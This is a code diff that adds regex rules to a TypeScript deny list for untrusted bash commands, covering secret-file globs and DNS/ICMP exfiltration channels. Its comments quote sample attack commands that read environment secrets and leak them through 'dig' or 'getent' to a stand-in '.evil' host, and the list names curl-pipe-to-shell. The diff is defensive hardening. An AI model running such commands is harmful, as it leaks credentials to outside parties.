@@ -597,6 +597,16 @@ const UNTRUSTED_BASH_DENY: { name: string; rx: RegExp }[] = [
   // only when an actual glob/quote metachar is present so plain dotfiles
   // (.eslintrc, .editorconfig) stay readable via bash.
   { name: "secret-file-glob", rx: /(^|[^\w.])\.(e[\w.-]*['"*?\[\]]|\[)/i },
+  // Trailing/embedded globs + find that reach a secret file WITHOUT the `.e`
+  // prefix (re-audit it.7: `cat *env.local`, `?env.local`, `.*local`,
+  // `find . -name '*local' -exec cat`). Defense-in-depth — on prod the secret
+  // file is .gitignore'd AND .dockerignore'd so it isn't in the image, but a
+  // future secret dropped in the repo root would otherwise be live.
+  { name: "secret-file-glob-trailing", rx: /[*?][\w.-]*(env|local|secret|cred|netrc|pgpass)\b|\.\*local\b|-name\s+['"]?[\w.*?-]*(env|local|secret|cred)/i },
+  // DNS / ICMP egress — exfil channels the upload rule misses (re-audit it.7:
+  // `getent hosts "$(cat …).evil"`, `dig $(…).evil`). Anchored to command
+  // position so words like "hostname" don't false-positive.
+  { name: "dns-icmp-egress", rx: /(^|[;&|`]\s*|\$\(\s*)(dig|nslookup|host|getent|ping|traceroute|nc)\b/i },
   { name: "curl-pipe-to-shell", rx: /\b(curl|wget)\b[^|;&]*[|]\s*(sudo\s+)?(sh|bash|zsh)\b/i },
 ];
 
